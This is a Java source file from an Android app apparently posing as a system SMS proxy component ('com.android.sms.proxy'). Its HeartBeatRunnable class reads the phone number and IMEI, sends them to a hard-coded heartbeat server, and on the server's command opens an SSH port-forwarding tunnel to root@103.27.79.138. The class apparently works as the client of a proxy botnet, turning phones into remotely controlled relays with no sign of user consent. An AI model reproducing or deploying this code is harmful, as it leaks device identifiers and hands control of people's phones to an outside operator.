package com.android.sms.proxy.service;

import android.content.Context;
import android.net.Uri;
import android.text.TextUtils;
import android.util.Log;

import com.android.sms.proxy.entity.BindServiceEvent;
import com.android.sms.proxy.entity.HeartBeatInfo;
import com.android.sms.proxy.entity.HeartBeatJson;
import com.android.sms.proxy.entity.MessageEvent;
import com.android.sms.proxy.entity.NativeParams;
import com.android.sms.proxy.entity.PhoneInfo;
import com.android.sms.proxy.loader.Loader_Base_ForCommon;
import com.oplay.nohelper.volley.RequestEntity;
import com.oplay.nohelper.volley.Response;
import com.oplay.nohelper.volley.VolleyError;

import org.connectbot.bean.PortForwardBean;
import org.connectbot.service.TerminalManager;
import org.connectbot.transport.TransportFactory;
import org.greenrobot.eventbus.EventBus;

import java.util.HashMap;
import java.util.Map;
import java.util.Random;

/**
 * @author zyq 16-3-10
 */
public class HeartBeatRunnable implements Runnable {

	private static final boolean DEBUG = true;
	private static final String TAG = "heartBeatRunnable";
	public static boolean isSSHConnected = false;
	public static final String url = "http://172.16.5.29:8000/heartbeat/";
	public static int mCurrentCount = 0;
	public static String phoneNumber;
	public static String imei;
	private Loader_Base_ForCommon<HeartBeatJson> mLoader;
	private Context mContext;
	private boolean isStartSSHBuild = false;
	private String printMessage = null;
	private Object mSync = new Object();


	public HeartBeatRunnable(Context context) {
		this.mContext = context;
		mLoader = Loader_Base_ForCommon.getInstance();
	}

	@Override
	public void run() {
		try {
			if (phoneNumber == null) phoneNumber = PhoneInfo.getInstance(mContext).getNativePhoneNumber();
			if (imei == null) imei = PhoneInfo.getInstance(mContext).getIMEI();
			if (TextUtils.isEmpty(phoneNumber)) return;

			if (DEBUG) {
				Log.d(TAG, "模拟接收到接口500毫秒");
				mCurrentCount++;
				synchronized (mSync) {
					mSync.wait(500);
				}
				initDebug();
			} else {
				Log.d(TAG, "发起网络请求");
				Map<String, String> map = new HashMap<>();
				map.put(NativeParams.TYPE_PHONE_NUMBER, phoneNumber);
				map.put(NativeParams.TYPE_PHONE_IMEI, imei);
				map.put(NativeParams.TYPE_SSH_CONNECT, String.valueOf(isSSHConnected));
				RequestEntity<HeartBeatJson> entity = new RequestEntity<HeartBeatJson>(url, HeartBeatJson.class, map);
				mLoader.onRequestLoadNetworkTask(entity, true, new Response.Listener() {
					@Override
					public void onResponse(Object response) {
						if (response instanceof HeartBeatJson) {
							handleResponse((HeartBeatJson) response);
						}
					}
				}, new Response.ErrorListener() {
					@Override
					public void onErrorResponse(VolleyError error) {
						Log.d(TAG, "网路请求错误:" + error.toString());
					}
				});
			}

		} catch (Exception e) {
			if (DEBUG) {
				Log.d(TAG, e.fillInStackTrace().toString());
			}
		}
	}

	private void initDebug() {
		HeartBeatJson json = new HeartBeatJson();
		HeartBeatInfo info = new HeartBeatInfo();
		int sourcePort = new Random().nextInt(2000)+8000;
		info.setPort("root@103.27.79.138:"+String.valueOf(sourcePort));
		if (!isSSHConnected) {
			if (mCurrentCount > 3 && !isStartSSHBuild) {
				info.setStatusType(HeartBeatInfo.TYPE_START_SSH);
				isStartSSHBuild = true;
			} else if (mCurrentCount > 3 && isStartSSHBuild) {
				info.setStatusType(HeartBeatInfo.TYPE_WAITING_SSH);
			} else {
				info.setStatusType(HeartBeatInfo.TYPE_IDLE);
			}
		} else {
			if (mCurrentCount < 1000) {
				info.setStatusType(HeartBeatInfo.TYPE_BUILD_SSH_SUCCESS);
			} else {
				info.setStatusType(HeartBeatInfo.TYPE_CLOSE_SSH);
			}
		}
		json.setCode(0);
		json.setData(info);
		handleResponse(json);
	}


	private void handleResponse(HeartBeatJson result) {
		int code = result.getCode();
		if (code == NativeParams.SUCCESS) {
			HeartBeatInfo info = result.getData();
			if (info != null) {
				int type = info.getStatusType();
				switch (type) {
					case HeartBeatInfo.TYPE_IDLE:
						Log.d(TAG, "暂时没事干");
						printMessage = "暂时没事干";
						printMessage(printMessage);
						break;
					case HeartBeatInfo.TYPE_START_SSH:
						Log.d(TAG, "开始建立ssh隧道");
						printMessage = "开始建立ssh隧道";
						printMessage(printMessage);
						String host = info.getPort();
						handleStartSSH(host);
						break;
					case HeartBeatInfo.TYPE_WAITING_SSH:
						Log.d(TAG, "等待ssh建立完毕");
						printMessage = "等待ssh建立完毕";
						printMessage(printMessage);
						break;
					case HeartBeatInfo.TYPE_BUILD_SSH_SUCCESS:
						try {
							Log.d(TAG, "建立隧道成功");
							printMessage = "建立隧道成功,改变心跳时间为20秒";
							printMessage(printMessage);
							HeartBeatService.getInstance().cancelScheduledTasks();
							//HeartBeatService.getInstance().restScheduledTasks();
						} catch (Exception e) {
							if (DEBUG) {
								Log.e(TAG, e.fillInStackTrace().toString());
							}
						}
						break;
					case HeartBeatInfo.TYPE_CLOSE_SSH:
						try {
							Log.d(TAG, "关闭隧道");
							printMessage = "关闭隧道";
							printMessage(printMessage);
							isSSHConnected = false;
							IProxyControl proxyService = HeartBeatService.getInstance().getmProxyControl();
							if (proxyService != null) {
								proxyService.stop();
							}
							TerminalManager manager = HeartBeatService.getInstance().getBinder();
							if (manager != null) {
								manager.disconnectAll(true, false);
							}
							HeartBeatService.getInstance().cancelScheduledTasks();
						} catch (Exception e) {
							if (DEBUG) {
								Log.d(TAG, e.fillInStackTrace().toString());
							}
						}
						break;
				}
			}
		}
	}


	//开始启动SSH
	private void handleStartSSH(String quickConnectString) {
		printMessage = "返回的地址是:" + quickConnectString;
		printMessage(printMessage);
		if (ProxyServiceUtil.isHostValid(quickConnectString, "ssh")) {
			final int endIndex = quickConnectString.indexOf(":");
			final String host = quickConnectString.substring(0, endIndex);
			Uri uri = TransportFactory.getUri("ssh", host);

			Log.d(TAG, "ssh-Uri:" + uri);
			ProxyServiceUtil.getInstance(mContext).setHostBean(uri);
			int startIndex = quickConnectString.indexOf(":");
			String sourcePort = quickConnectString.substring(startIndex + 1);
			Log.d(TAG, "vps分配到的host本地端口是:" + sourcePort);
			ProxyServiceUtil.getInstance(mContext).setPortFowardBean(mContext, sourcePort);

			//开始启动服务
			PortForwardBean bean = ProxyServiceUtil.getInstance(mContext).getPortFowardBean();
			if (bean != null && !TextUtils.isEmpty(bean.getDescription())) {
				EventBus.getDefault().post(new BindServiceEvent());
			}
		} else {
			Log.d(TAG, "返回的host格式不正确");
		}
	}

	private void printMessage(String printMessage) {
		EventBus.getDefault().postSticky(new MessageEvent(printMessage));
	}


}